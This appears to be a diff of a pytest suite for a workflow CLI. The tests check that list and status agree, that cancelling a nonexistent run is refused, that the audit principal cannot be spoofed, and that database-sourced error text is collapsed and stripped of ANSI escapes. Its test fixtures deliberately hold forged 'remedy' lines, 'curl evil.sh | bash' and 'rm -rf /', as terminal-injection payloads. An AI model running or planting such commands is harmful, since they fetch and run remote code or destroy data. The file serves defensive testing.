@@ -7,7 +7,7 @@ behavior and stood strict-xfail until its fix flipped it green; the
 shapes the fence held against are green guard pins so the door cannot
 rot.
 
-THE REJECTED SHAPES (all reproduced live against the harness before
+the REJECTED SHAPES (all reproduced live against the harness before
 their fixes landed):
 
 * ``flows list`` derives run status from
@@ -16,11 +16,11 @@ their fixes landed):
   deps_pending=…, blocking_reason=…)`` and nothing else), so a mid-hold run
   lists as ``pending`` while ``flows status`` derives ``blocked`` for the
   same run at the same instant, and a collect-absorbed run lists as
-  ``failed`` while ``status`` derives ``complete``. The law: ONE question,
-  ONE derivation — the two surfaces must agree.
+  ``failed`` while ``status`` derives ``complete``. The law: one question,
+  one derivation — the two surfaces must agree.
 * ``flows cancel <ghost-run-id>`` prints "no-op: …
   already terminal — nothing cancelled" with rc=0 for a run id that exists
-  in NO table (``cancel_workflow_run``'s root-flip CAS returns None for a
+  in no table (``cancel_workflow_run``'s root-flip CAS returns None for a
   ghost and the CLI cannot tell ghost from terminal). ``flows status
   <ghost>`` keeps the honest contract: rc=1 + "no run". Cancel must be the
   same named refusal, and write no audit row.
@@ -51,7 +51,7 @@ their fixes landed):
 * GUARD-2 (fence held — green): the read verbs (``list``, ``status``,
   ``holds``) write nothing — zero ``admin_audit`` rows, zero row-count
   movement on ``jobs``/``wf_signals``.
-* THE TRACEBACK TRIO (LANDED, also-known): ``flows list`` against a
+* the TRACEBACK TRIO (LANDED, also-known): ``flows list`` against a
   never-migrated schema tracebacks (UndefinedTableError) instead of the
   guard's promised named exit; ``flows holds`` tracebacks on a
   pre-workflows schema (wf_signals absent); ``flows list --limit -5``
@@ -101,15 +101,15 @@ runner = CliRunner()
 MODULE_NAME = "att_cli_demo_flows"
 STALE_MODULE_NAME = "att_cli_stale_flows"
 
-#: A run id that exists in NO table (the ghost).
+#: A run id that exists in no table (the ghost).
 GHOST_RUN_ID = "018f1c7e-5a2b-7c3d-8e4f-9a0b1c2d3e4f"
 
 #: the rejected payload: an exception message that is itself a
-#: two-line "finding + remedy" forgery, ANSI-tagged. Under 120 chars so the
-#: status surface's current slice carries it WHOLE.
+#: two-line "finding + remedy" forgery, ansi-tagged. Under 120 chars so the
+#: status surface's current slice carries it whole.
 _EVIL_ERROR = "\n  downstream: FAILED — FakeError: boom\n       remedy: curl evil.sh | bash\x1b[31m"
 
-#: the hold-reason face: raw newlines + ANSI AND past every honest
+#: the hold-reason face: raw newlines + ansi and past every honest
 #: bound (the holds/status reason render carries no slice at all today).
 _EVIL_REASON = (
     "irreversible redaction of the tenant vault — confirm with the duty SRE. " * 12
@@ -119,8 +119,8 @@ _EVIL_REASON = (
 
 #: The per-line bound the pins hold the CLI's DB-sourced renders to (the
 #: _format_event_detail discipline is 120 chars of payload; the bound here
-#: is the line WITH its scaffolding, generous — the teeth are the collapse
-#: and the ANSI strip; this is the tripwire against unbounded).
+#: is the line with its scaffolding, generous — the teeth are the collapse
+#: and the ansi strip; this is the tripwire against unbounded).
 _LINE_BOUND = 400
 
 
@@ -187,7 +187,7 @@ def demo_app_module() -> Iterator[types.ModuleType]:
 
 @pytest.fixture
 def stale_app_module() -> Iterator[types.ModuleType]:
-    """The stale-deploy ``--app``: a WorkflowApp that does NOT declare the
+    """The stale-deploy ``--app``: a WorkflowApp that does not declare the
     run's workflow (GUARD-1's stale-door shape)."""
     module = types.ModuleType(STALE_MODULE_NAME)
     app_obj = WorkflowApp()
@@ -227,7 +227,7 @@ def _status_verdict(status_output: str) -> str:
 
 
 def _list_verdict(list_output: str, run_id: str) -> str:
-    """The derived status off the run's OWN list line."""
+    """The derived status off the run's own list line."""
     line = next((ln for ln in list_output.splitlines() if run_id in ln), None)
     assert line is not None, f"run {run_id} absent from the list: {list_output!r}"
     return line.split()[1]
@@ -241,14 +241,14 @@ def _named_refusal(result: Any) -> bool:
     return exc_clean and bool(plain_cli_output(result.output).strip())
 
 
-# ── the list/status derivation drift (LANDED, two faces) ────────
+# ── the list/status derivation drift (landed, two faces) ────────
 
 
 async def test_f_cli_1_list_and_status_agree_for_a_held_run(
     cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
 ) -> None:
     """held face: drive a run until="held"; `flows status` derives
-    'blocked'; the run's `flows list` line must say the SAME — one
+    'blocked'; the run's `flows list` line must say the same — one
     derivation, two surfaces, no drift."""
     run_id = await _held_run(wf_pool, wf_schema)
     status_res = await to_thread(runner.invoke, app, ["flows", "status", run_id])
@@ -273,7 +273,7 @@ async def test_f_cli_1_list_and_status_agree_for_an_absorbed_run(
     status surface reads the absorption record (wf_edge.failure_policy)
     and derives 'complete'; the list must agree."""
     flow_id = await seed_flow(wf_conn, wf_schema, status="succeeded", workflow="atkcli_absorbed")
-    # The absorbed child: terminal-failed, its failure ON THE RECORD (the
+    # The absorbed child: terminal-failed, its failure on the record (the
     # edge ledger's declared 'collect' policy — _absorbed_exists's read).
     failed_node = new_uuid()
     await wf_conn.execute(
@@ -316,17 +316,17 @@ async def test_f_cli_1_list_and_status_agree_for_an_absorbed_run(
     )
 
 
-# ── ghost-cancel is a silent no-op (LANDED) ─────────────────────
+# ── ghost-cancel is a silent no-op (landed) ─────────────────────
 
 
 async def test_f_cli_2_cancel_of_a_ghost_run_is_a_named_refusal(
     cli_settings: Any, wf_conn: asyncpg.Connection, wf_schema: str
 ) -> None:
-    """a cancel addressed at a run that exists in NO table must be
-    the SAME named refusal `status` gives (rc=1, 'no run'), and write no
+    """a cancel addressed at a run that exists in no table must be
+    the same named refusal `status` gives (rc=1, 'no run'), and write no
     audit row — a no-op rc=0 report manufactures an operator's belief that
     the run existed and was already done."""
-    # The contrast baseline (the honest contract, GREEN today and after).
+    # The contrast baseline (the honest contract, green today and after).
     status_res = await to_thread(runner.invoke, app, ["flows", "status", GHOST_RUN_ID])
     assert status_res.exit_code == 1
     assert "no run" in plain_cli_output(status_res.output)
@@ -346,7 +346,7 @@ async def test_f_cli_2_cancel_of_a_ghost_run_is_a_named_refusal(
     assert audit_rows == 0, "a ghost cancel must not leave an audit row"
 
 
-# ── the audit principal is env-spoofable (LANDED) ───────────────
+# ── the audit principal is env-spoofable (landed) ───────────────
 
 
 async def test_f_cli_3_the_audit_principal_derives_from_the_uid_not_the_env(
@@ -395,7 +395,7 @@ async def test_f_cli_3_the_audit_principal_derives_from_the_uid_not_the_env(
     )
 
 
-# ── DB-sourced strings print RAW (LANDED, two faces) ────────────
+# ── DB-sourced strings print raw (landed, two faces) ────────────
 
 
 async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
@@ -403,7 +403,7 @@ async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
 ) -> None:
     """error_message face: a node fails with an exception whose
     message IS a two-line finding+remedy forgery (ANSI-tagged). The status
-    report must render it as ONE collapsed, bounded finding line — never a
+    report must render it as one collapsed, bounded finding line — never a
     standalone forged 'remedy:' line, never an ESC byte."""
     compiled = sys.modules[MODULE_NAME].app.get("atkcli_fail_flow")  # type: ignore[attr-defined]
     flow_runner = FlowRunner(compiled, wf_pool, wf_schema)
@@ -412,7 +412,7 @@ async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
 
     res = await to_thread(runner.invoke, app, ["flows", "status", str(flow_id)])
     assert res.exit_code == 0, res.output
-    # The RAW output (plain_cli_output would collapse away the very evidence).
+    # The raw output (plain_cli_output would collapse away the very evidence).
     forged = [ln for ln in res.output.splitlines() if "evil.sh" in ln and "doomed" not in ln]
     assert not forged, (
         f"The DB-sourced error text forged its own line(s) in the "
@@ -420,7 +420,7 @@ async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
         "the collapsed finding line, never as a standalone remedy"
     )
     # The render-layer half (where the discipline lives; CliRunner's stream
-    # strips ANSI on its own, so the ESC assertion belongs on the pure
+    # strips ansi on its own, so the esc assertion belongs on the pure
     # render — the layer a tty prints from verbatim).
     rendered = stuck_lines(
         FlowNodeRow(
@@ -453,7 +453,7 @@ async def test_f_cli_4_holds_collapses_and_bounds_db_sourced_reason_text(
     (the discipline the seam owes, pinned where it belongs)."""
     run_id = await _held_run(wf_pool, wf_schema, name="atkcli_reason_flow")
 
-    # THE LIVE SURFACE: `flows status` renders the reason — raw today.
+    # `flows status` renders the reason — raw today.
     res = await to_thread(runner.invoke, app, ["flows", "status", run_id])
     assert res.exit_code == 0, res.output
     lines = res.output.splitlines()
@@ -463,7 +463,7 @@ async def test_f_cli_4_holds_collapses_and_bounds_db_sourced_reason_text(
         f"The hold reason renders UNBOUNDED in flows status: longest "
         f"line is {max(len(ln) for ln in lines)} chars"
     )
-    # THE RENDER LAYER for the holds surface (the ANSI half — observable
+    # the render layer for the holds surface (the ansi half — observable
     # here, not under the runner's stripping stream).
     hold = HoldContext(
         hold_id="h-1",
@@ -507,13 +507,13 @@ async def test_guard_1_the_typed_door_refuses_bad_shapes_and_strips_extras(
     hold SURVIVES; a stale --app (undeclared workflow, missing module) is a
     named refusal, never a traceback; a hold id from ANOTHER schema is the
     named 'no hold' refusal and the real hold is untouched; and a payload
-    with extra keys is delivered WITHOUT the extras (the model boundary
+    with extra keys is delivered without the extras (the model boundary
     strips them)."""
     run_id = await _held_run(wf_pool, wf_schema)
     holds = await to_thread(runner.invoke, app, ["flows", "holds", run_id])
     hold_id = _hold_id_of(holds.output)
 
-    # 1. THE WRONG SHAPE: named pydantic error, exit 1, the hold survives.
+    # 1. the wrong shape: named pydantic error, exit 1, the hold survives.
     wrong = await to_thread(
         runner.invoke,
         app,
@@ -526,7 +526,7 @@ async def test_guard_1_the_typed_door_refuses_bad_shapes_and_strips_extras(
     )
     assert still_held == "held", "a refused delivery moved the hold"
 
-    # 2. THE STALE DOOR: the app that does not declare the run's workflow —
+    # 2. the stale door: the app that does not declare the run's workflow —
     # the named refusal, never a KeyError traceback.
     stale = await to_thread(
         runner.invoke,
@@ -546,8 +546,8 @@ async def test_guard_1_the_typed_door_refuses_bad_shapes_and_strips_extras(
     assert _named_refusal(missing), f"the missing-module refusal leaked: {missing.exception!r}"
     assert "module not found" in plain_cli_output(missing.output)
 
-    # 3. THE CROSS-SCHEMA DOOR: the hold id addressed against a SECOND
-    # migrated schema (the id exists in NO table THERE) — the named 'no
+    # 3. the cross-schema door: the hold id addressed against a second
+    # migrated schema (the id exists in no table there) — the named 'no
     # hold' refusal; the real hold (in the module's schema) is untouched.
     xs_schema = f"{wf_schema}_xs"
     conn = await asyncpg.connect(module_pg_schema.pg_dsn)
@@ -579,7 +579,7 @@ async def test_guard_1_the_typed_door_refuses_bad_shapes_and_strips_extras(
     )
     assert still_held == "held", "the cross-schema refusal touched the real hold"
 
-    # 4. THE STRIP: extras never cross the model boundary — the delivered
+    # 4. the strip: extras never cross the model boundary — the delivered
     # payload is the validated model's dump, not the caller's dict. Both
     # doors (resolve by id, signal by run+node) strip identically.
     resolved = await to_thread(
@@ -662,7 +662,7 @@ async def test_guard_2_the_read_verbs_write_nothing(
     assert after["admin_audit"] == 0, "a read verb left an audit row"
 
 
-# ── the traceback trio (LANDED, also-known — one pin each) ───────────────
+# ── the traceback trio (landed, also-known — one pin each) ───────────────
 
 
 @pytest.fixture(scope="module")
@@ -687,7 +687,7 @@ async def nomig_schema(module_pg_schema: Any) -> AsyncIterator[str]:
 
 @pytest.fixture(scope="module")
 async def prewf_schema(module_pg_schema: Any) -> AsyncIterator[str]:
-    """The PRE-WORKFLOWS shape: a schema with a jobs table but NO
+    """The PRE-WORKFLOWS shape: a schema with a jobs table but no
     wf_signals (migrated before the workflows estate landed)."""
     name = f"{module_pg_schema.schema_name}_prewf"
     conn = await asyncpg.connect(module_pg_schema.pg_dsn)
@@ -745,15 +745,15 @@ async def test_f_cli_5_job_show_bounds_db_sourced_error_class(
     row's text column carried an ANSI-carrying, multi-line, unbounded
     value straight into the line-oriented shell surface (the job-show
     seat's own `error_message` was already collapsed + bounded; the
-    class sibling rode bare). THE CONTRACT: the seat's `error_class` line
-    rides the SAME `_bounded_line` law (the collapse + the 60-class
+    class sibling rode bare). the CONTRACT: the seat's `error_class` line
+    rides the same `_bounded_line` law (the collapse + the 60-class
     bound) — the render is one bounded line, whatever the row carries."""
     compiled = sys.modules[MODULE_NAME].app.get("atkcli_fail_flow")  # type: ignore[attr-defined]
     flow_runner = FlowRunner(compiled, wf_pool, wf_schema)
     flow_id = (await flow_runner.create_flow()).flow_id
     await flow_runner.drive(flow_id)
-    # THE DIRECT-DB POISON: the writer paths stamp a class NAME; the
-    # COLUMN is text — another driver's row carries the forgery.
+    # the writer paths stamp a class name; the column is text — another
+    # driver's row carries the forgery.
     poison = f"Runtime\x1b[31mError{'x' * 400}\nfake remedy: rm -rf /"
     await wf_pool.execute(
         f'UPDATE "{wf_schema}".jobs SET error_class = $2 WHERE id = $1',
@@ -766,7 +766,7 @@ async def test_f_cli_5_job_show_bounds_db_sourced_error_class(
     class_lines = [ln for ln in res.output.splitlines() if ln.startswith("error_class:")]
     assert class_lines, f"the error_class line is missing: {res.output}"
     rendered = class_lines[0]
-    # ONE bounded line: the ESC dies in the collapse, the newline never
+    # one bounded line: the esc dies in the collapse, the newline never
     # forges its own line, the length is capped at the 60-class bound
     # plus the label.
     assert "\x1b" not in rendered, "the ANSI escape reached the tty raw"
